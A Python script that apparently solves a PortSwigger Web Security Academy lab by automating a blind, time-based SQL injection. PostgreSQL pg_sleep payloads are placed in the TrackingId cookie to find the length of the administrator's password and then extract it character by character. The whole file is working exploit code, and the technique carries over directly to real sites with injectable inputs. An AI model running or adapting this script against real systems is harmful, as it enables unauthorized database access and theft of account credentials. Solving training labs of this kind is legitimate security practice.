import os
import requests
import string

def clearScreen():
    currentOS = os.name 

    if currentOS == "nt": os.system('cls')
    elif currentOS == "posix": os.system('clear')

def getPwLength():
    maxLen = 25
    for i in range(1, maxLen+1):
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36',
            'Cookie': f"TrackingId={trackingID}'%3b+select+case+when+(length(password)%3d{i})+then+pg_sleep({sleepTime})+else+pg_sleep(0)+end+from+users+where+username%3d'administrator'--;session={sessionID}"
        }

        res = requests.get(url, headers=headers)
        elapsedTime = res.elapsed.seconds

        # To take into consideration that it will not be exactly 10 seconds due to network delays
        if elapsedTime >= sleepTime:
            print(f"[+] Password Length for administrator is {i}.")
            return(i)

def getPassword():
    # Generate chars + numbers
    charsets = '0123456789' + string.ascii_lowercase 

    adminPassword = ''
    print('[+] Guessing administrator\'s password:')

    # Outer loop - Encompass the password length
    for i in range(1, pwLen +1):
        # Inner loop - Loop between individual characters from the charset
        for c in charsets:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36',
                'Cookie': f"TrackingId={trackingID}'%3b+select+case+when+(substring(password,{i},1)%3d'{c}')+then+pg_sleep({sleepTime})+else+pg_sleep(0)+end+from+users+where+username%3d'administrator'--;session={sessionID}"
            }

            res = requests.get(url, headers=headers)
            elapsedTime = res.elapsed.seconds

            # If elapsed time is greater than sleep time it means that we hit the correct password character on the current index
            if elapsedTime >= sleepTime:
                adminPassword += c
                print(f"[+] Password: {adminPassword}", end='\r', flush=False)
                break # Once password is found on current index, breaks out of for loop and go to the next index
    
    print(f"[+] Password: {adminPassword}")

if __name__ == "__main__":
    host = '' # Insert host here
    url = f'https://{host}.web-security-academy.net/'
    trackingID = '' # Insert tracking id here
    sessionID = '' # Insert session id here
    sleepTime = 10

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36',
        'Cookie': f"TrackingId={trackingID}'%3bselect+pg_sleep(10)--; session={sessionID}"
    }

    clearScreen()
    pwLen = getPwLength()
    # pwLen = 20
    getPassword()
    